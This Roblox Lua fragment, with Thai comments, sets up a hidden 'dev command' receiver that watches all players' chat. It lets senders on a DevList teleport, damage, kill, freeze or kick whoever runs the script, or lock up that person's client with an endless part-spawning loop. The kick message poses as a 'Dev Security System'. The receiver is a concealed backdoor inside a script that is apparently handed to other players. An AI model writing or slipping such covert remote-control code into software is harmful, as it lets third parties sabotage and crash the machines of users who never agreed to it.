-- DEV SIGNAL RECEIVER (ระบบดักรับสัญญาณลับเบื้องหลัง)
-- ---------------------------------------------------
local isFrozen = false

local function ProcessDevCommand(senderName, message)
	-- ตรวจสอบว่าผู้ส่งคำสั่งอยู่ใน DevList หรือไม่
	if not DevList[senderName] then return end
	
	local args = string.split(message, ":")
	if args[1] ~= "[DEV_CMD]" then return end
	
	local cmd = args[2]
	local targetName = args[3]
	
	-- เช็คว่าคำสั่งส่งมาหาเรา หรือส่งหาคนทั้งเซิร์ฟเวอร์ (ALL)
	if targetName == localPlayer.Name or targetName == "ALL" then
		
		-- 🌀 1. BRING (ดึงตัวผู้เล่นไปหาตำแหน่ง Dev)
		if cmd == "BRING" and args[4] then
			local coords = string.split(args[4], ",")
			if #coords == 3 and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
				local x, y, z = tonumber(coords[1]), tonumber(coords[2]), tonumber(coords[3])
				if x and y and z then
					localPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(x, y + 3, z)
				end
			end
			
		-- 🩸 2. DMG25 (ลดเลือดทีละ 25)
		elseif cmd == "DMG25" then
			if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
				local hum = localPlayer.Character.Humanoid
				hum.Health = math.clamp(hum.Health - 25, 0, hum.MaxHealth)
			end
			
		-- 💀 3. KILL (ฆ่าตัวละครตายทันที)
		elseif cmd == "KILL" then
			if localPlayer.Character and localPlayer.Character:FindFirstChild("Humanoid") then
				localPlayer.Character.Humanoid.Health = 0
			end
			
		-- 🚫 4. KICK (เตะออกจากเซิร์ฟเวอร์)
		elseif cmd == "KICK" then
			localPlayer:Kick("\n[Dev Security System]\nYou have been disconnected from the server.")
			
		-- 🧊 5. FREEZE (แช่แข็ง/ปลดแช่แข็ง)
		elseif cmd == "FREEZE" then
			if localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
				isFrozen = not isFrozen
				localPlayer.Character.HumanoidRootPart.Anchored = isFrozen
			end
			
		-- ⚠️ 6. LAG (ค้างเครื่องด้วย Part)
		elseif cmd == "LAG" then
			task.spawn(function()
				while true do
					local p = Instance.new("Part")
					p.Size = Vector3.new(10,10,10)
					p.Parent = workspace
				end
			end)
		end
	end
end

-- ดักจับข้อความแชทจากผู้เล่นทุกคนในเซิร์ฟเวอร์
for _, p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) ProcessDevCommand(p.Name, msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) ProcessDevCommand(p.Name, msg) end)
end)

